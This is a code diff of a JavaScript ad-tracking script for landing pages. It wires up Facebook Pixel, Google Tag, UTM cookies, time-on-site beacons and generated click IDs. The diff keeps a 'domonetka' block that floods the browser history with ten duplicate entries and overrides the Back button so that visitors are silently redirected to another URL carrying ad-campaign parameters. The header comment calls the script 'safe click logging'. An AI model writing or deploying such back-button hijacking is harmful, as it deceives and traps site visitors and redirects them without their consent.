@@ -1,19 +1,89 @@
+// Prepare fallback subid when cookie is missing on main domains.
 (function () {
-    // Вспомогательная функция для получения значения cookie
     function getCookie(name) {
-        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
-        return match ? match[2] : null;
+        const matches = document.cookie.match(
+            new RegExp('(?:^|; )' + name.replace(/([$?*|{}()[\]\\/+^])/g, '\\$1') + '=([^;]*)')
+        );
+        return matches ? decodeURIComponent(matches[1]) : null;
     }
 
-    // Получаем URL-параметры один раз
+    function isSubdomain(hostname) {
+        if (!hostname) return false;
+        var normalized = hostname.replace(/^www\./i, '');
+        return normalized.split('.').length > 2;
+    }
+
+    function nextClickIndex() {
+        var counter = 0;
+        try {
+            counter = parseInt(sessionStorage.getItem('boostclicks_click_counter'), 10) || 0;
+        } catch (e) { counter = 0; }
+        counter += 1;
+        try { sessionStorage.setItem('boostclicks_click_counter', String(counter)); } catch (e) { }
+        return counter;
+    }
+
+    function replacePlaceholderInputs(value) {
+        if (!value) return;
+        var update = function () {
+            var inputs = document.querySelectorAll('form input[value="{subid}"], form input[data-boostclicks-subid="1"]');
+            inputs.forEach(function (input) {
+                input.value = value;
+                input.setAttribute('value', value);
+                input.setAttribute('data-boostclicks-subid', '1');
+            });
+        };
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', update);
+        } else {
+            update();
+        }
+    }
+
+    var hostname = window.location.hostname;
+    var cookieSubid = getCookie('_subid');
+    var hasCookieSubid = cookieSubid && cookieSubid !== '{subid}';
+    var fallbackSubid = null;
+
+    if (!hasCookieSubid && !isSubdomain(hostname)) {
+        var clickIndex = nextClickIndex();
+        fallbackSubid = 'boostclicks_' + hostname + '_' + clickIndex;
+        replacePlaceholderInputs(fallbackSubid);
+        try { sessionStorage.setItem('boostclicks_subid', fallbackSubid); } catch (e) { }
+    }
+
+    window.__boostclicksSubidOverride = fallbackSubid;
+    window.__boostclicksShouldOverrideSubid = !hasCookieSubid && !isSubdomain(hostname);
+    window.__boostclicksReplaceSubidInputs = replacePlaceholderInputs;
+})();
+
+// Main tracking script: handles pixel params + safe click logging with UTM tags.
+(function () {
+    function getCookie(name) {
+        const matches = document.cookie.match(
+            new RegExp('(?:^|; )' + name.replace(/([$?*|{}()[\]\\/+^])/g, '\\$1') + '=([^;]*)')
+        );
+        return matches ? decodeURIComponent(matches[1]) : null;
+    }
+
+    function hasDomonetkaUrl() {
+        return typeof domonetka !== 'undefined' &&
+            domonetka &&
+            domonetka.trim() !== '' &&
+            domonetka !== '{domonetka}';
+    }
+
     const urlParams = new URLSearchParams(window.location.search);
     const pxl = urlParams.get('pxl') || '';
     const contentIds = urlParams.get('content_ids');
-    const subid = getCookie('_subid');
+    const subidCookie = getCookie('_subid');
+    const subid = (subidCookie && subidCookie !== '{subid}') ? subidCookie : (window.__boostclicksSubidOverride || null);
+    const domonetkaActive = hasDomonetkaUrl();
 
-    // Вспомогательная функция для записи в sessionStorage, если значение существует
     const setSessionItem = (key, value) => {
-        if (value) sessionStorage.setItem(key, value);
+        if (value) {
+            sessionStorage.setItem(key, value);
+        }
     };
 
     setSessionItem('pxl', pxl);
@@ -21,12 +91,11 @@
     setSessionItem('event_id', subid);
     setSessionItem('content_ids', contentIds);
 
-    // Проверяем, что переменная domonetka определена и не пустая
-    if (typeof domonetka !== 'undefined' && domonetka) {
+    if (domonetkaActive) {
         setSessionItem('dom', domonetka);
     }
 
-    // Инициализация Facebook Pixel, если указан pxl
+    // Init Facebook Pixel when pxl present.
     if (pxl) {
         !function (f, b, e, v, n, t, s) {
             if (f.fbq) return;
@@ -46,7 +115,6 @@
         }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
 
         fbq('init', pxl);
-
         if (contentIds) {
             fbq('track', 'PageView', { content_ids: contentIds });
         } else {
@@ -54,64 +122,67 @@
         }
     }
 
-// Обработка переходов для domonetka
-if (typeof domonetka !== 'undefined' && domonetka && domonetka.trim() !== '' && domonetka !== '{domonetka}') {
-    try {
-        window.onpopstate = function (event) {
-            if (event.state) {
-                const currentUrlParams = new URLSearchParams(window.location.search);
-                const newUrlParams = new URLSearchParams();
+    // Handle back/forward for domonetka redirects.
+    if (domonetkaActive) {
+        try {
+            window.onpopstate = function (event) {
+                if (event.state) {
+                    const currentUrlParams = new URLSearchParams(window.location.search);
+                    const newUrlParams = new URLSearchParams();
 
-                const paramMap = {
-                    source: 'source',
-                    ev: 'ev',
-                    acc: 'sub_id_2',
-                    ad: 'sub_id_11',
-                    placement: 'sub_id_3',
-                    buyer: 'sub_id_4',
-                    pxl: 'pxl',
-                    adset: 'sub_id_5',
-                    gclid: 'gclid',
-                    gt: 'gt',
-                    pt: 'pt'
-                };
+                    const paramMap = {
+                        source: 'source',
+                        ev: 'ev',
+                        acc: 'sub_id_2',
+                        ad: 'sub_id_11',
+                        placement: 'sub_id_3',
+                        buyer: 'sub_id_4',
+                        pxl: 'pxl',
+                        adset: 'sub_id_5',
+                        gclid: 'gclid',
+                        gt: 'gt',
+                        pt: 'pt'
+                    };
 
-                Object.entries(paramMap).forEach(([srcParam, targetParam]) => {
-                    if (currentUrlParams.has(srcParam)) {
-                        newUrlParams.set(targetParam, currentUrlParams.get(srcParam));
-                    }
-                });
+                    Object.entries(paramMap).forEach(function ([srcParam, targetParam]) {
+                        if (currentUrlParams.has(srcParam)) {
+                            newUrlParams.set(targetParam, currentUrlParams.get(srcParam));
+                        }
+                    });
 
-                const newUrl = `${domonetka}?${newUrlParams.toString()}`;
-                location.replace(newUrl);
+                    const newUrl = domonetka + '?' + newUrlParams.toString();
+                    location.replace(newUrl);
+                }
+            };
+
+            for (let i = 0; i < 10; i++) {
+                setTimeout(function () {
+                    history.pushState({}, '', window.location.href);
+                }, i * 50);
             }
-        };
-
-        for (let i = 0; i < 10; i++) {
-            setTimeout(() => history.pushState({}, "", window.location.href), i * 50);
+        } catch (error) {
+            console.error(error);
         }
-    } catch (error) {
-        console.error(error);
     }
-}
 
-    // Установка UTMCookies и интеграция Google Tag Manager
+    // Store selected params in cookies for GTM.
     function setUTMCookies() {
         const utmParameters = ['gt', 'pt', 'ad_id', 'acc', 'buyer'];
-        utmParameters.forEach(param => {
+        utmParameters.forEach(function (param) {
             if (urlParams.has(param)) {
                 const value = urlParams.get(param);
-                document.cookie = `${param}=${encodeURIComponent(value)}; path=/; max-age=3600`;
+                document.cookie = param + '=' + encodeURIComponent(value) + '; path=/; max-age=3600';
             }
         });
     }
     setUTMCookies();
 
+    // Init Google Tag if present.
     if (urlParams.has('gt')) {
         const gt = urlParams.get('gt');
         const gtmScript = document.createElement('script');
         gtmScript.async = true;
-        gtmScript.src = `https://www.googletagmanager.com/gtag/js?id=${gt}`;
+        gtmScript.src = 'https://www.googletagmanager.com/gtag/js?id=' + gt;
         document.head.appendChild(gtmScript);
         window.dataLayer = window.dataLayer || [];
         window.gtag = function () {
@@ -121,19 +192,19 @@ if (typeof domonetka !== 'undefined' && domonetka && domonetka.trim() !== '' && 
         gtag('config', gt);
     }
 
-    // Отслеживание времени нахождения на сайте (sub_id_21)
+    // Time-on-site tracking (sub_id_21) when subid exists.
     if (subid && subid !== '{subid}') {
         const clickid = subid;
-        const address = `${window.location.protocol}//${window.location.hostname}?_update_tokens=1&sub_id=${clickid}`;
-    
+        const address = window.location.protocol + '//' + window.location.hostname + '?_update_tokens=1&sub_id=' + clickid;
+
         var step = 5;
         var counter = 0;
         setInterval(function () {
             counter += step;
-            createPixel(`${address}&sub_id_21=${counter}`);
+            createPixel(address + '&sub_id_21=' + counter);
         }, step * 1000);
     }
-    
+
     function createPixel(url) {
         var img = document.createElement('img');
         img.src = url;
@@ -151,7 +222,8 @@ if (typeof domonetka !== 'undefined' && domonetka && domonetka.trim() !== '' && 
         return matches ? decodeURIComponent(matches[1]) : null;
     }
 
-    var subid = getCookie('_subid');
+    var subidCookie = getCookie('_subid');
+    var subid = (subidCookie && subidCookie !== '{subid}') ? subidCookie : (window.__boostclicksSubidOverride || null);
     var hostname = window.location.hostname;
 
     // avoid duplicate logging on reloads
@@ -217,6 +289,21 @@ if (typeof domonetka !== 'undefined' && domonetka && domonetka.trim() !== '' && 
             .then(function (res) { return res.json(); })
             .then(function (data) {
                 if (data && data.success && data.click_id) {
+                    if (window.__boostclicksShouldOverrideSubid) {
+                        var generatedSubid = 'boostclicks_' + hostname + '_' + data.click_id;
+                        window.__boostclicksSubidOverride = generatedSubid;
+                        subid = subid || generatedSubid;
+                        try {
+                            sessionStorage.setItem('boostclicks_subid', generatedSubid);
+                            sessionStorage.setItem('external_id', generatedSubid);
+                            sessionStorage.setItem('event_id', generatedSubid);
+                        } catch (e) { }
+                        try {
+                            if (window.__boostclicksReplaceSubidInputs) {
+                                window.__boostclicksReplaceSubidInputs(generatedSubid);
+                            }
+                        } catch (e) { }
+                    }
                     sessionStorage.setItem('analytics_click_id', String(data.click_id));
                     sessionStorage.setItem('analytics_click_logged', '1');
                 }
